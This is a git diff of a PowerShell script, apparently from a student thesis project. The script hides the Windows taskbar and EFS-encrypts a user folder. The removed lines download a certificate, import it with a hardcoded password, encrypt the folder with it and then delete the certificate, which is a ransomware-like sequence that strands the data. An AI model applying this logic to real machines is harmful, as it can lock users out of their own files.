@@ -53,38 +53,39 @@ Sleep 2
 $taskbarHwnd = [Taskbar]::FindWindow("Shell_TrayWnd", "")
 [Taskbar]::ShowWindow($taskbarHwnd, [Taskbar]::SW_HIDE)
 
-# Define the URL of the file to download
-$fileUrl = "https://raw.githubusercontent.com/haiduc29/Script-Licenta/main/certificate.pfx"
+# # Define the URL of the file to download
+# $fileUrl = "https://raw.githubusercontent.com/haiduc29/Script-Licenta/main/certificate.pfx"
 
-# Define the path where the file will be saved
-$outputPath = "C:\Users\ionut\Downloads\certificate.pfx"
+# # Define the path where the file will be saved
+# $outputPath = "C:\Users\ionut\Downloads\certificate.pfx"
 
-# Download the file
-Invoke-WebRequest -Uri $fileUrl -OutFile $outputPath
+# # Download the file
+# Invoke-WebRequest -Uri $fileUrl -OutFile $outputPath
 
-# Define the path to the certificate and the password
-$certPath = "C:\Users\ionut\Downloads\certificate.pfx"
-$certPassword = ConvertTo-SecureString -String "1993" -Force -AsPlainText
+# # Define the path to the certificate and the password
+# $certPath = "C:\Users\ionut\Downloads\certificate.pfx"
+# $certPassword = ConvertTo-SecureString -String "1993" -Force -AsPlainText
 
-# Import the certificate
-$cert = Import-PfxCertificate -FilePath $certPath -CertStoreLocation "Cert:\CurrentUser\My" -Password $certPassword
 
-# Output the thumbprint of the imported certificate
-$certThumbprint = $cert.Thumbprint
-Write-Host "Imported certificate with thumbprint: $certThumbprint"
+# # Import the certificate
+# $cert = Import-PfxCertificate -FilePath $certPath -CertStoreLocation "Cert:\CurrentUser\My" -Password $certPassword
 
-# Define the path to the folder to be encrypted
-$folderPath = "C:\Users\ionut\Desktop\Test"
+# # Output the thumbprint of the imported certificate
+# $certThumbprint = $cert.Thumbprint
+# Write-Host "Imported certificate with thumbprint: $certThumbprint"
+
+# # Define the path to the folder to be encrypted
+# $folderPath = "C:\Users\ionut\Desktop\Test"
 
 # Encrypt the folder
-cipher /e:$certThumbprint /E /S:"$folderPath"
+cipher /E /S:"$folderPath"
 Write-Host "Folder encrypted successfully."
 
 # Remove the certificate from the store
-Remove-Item -Path "Cert:\CurrentUser\My\$certThumbprint"
+#Remove-Item -Path "Cert:\CurrentUser\My\$certThumbprint"
 
 # Remove the file
-Remove-Item -Path $certPath
+#Remove-Item -Path $certPath
 
 
 }
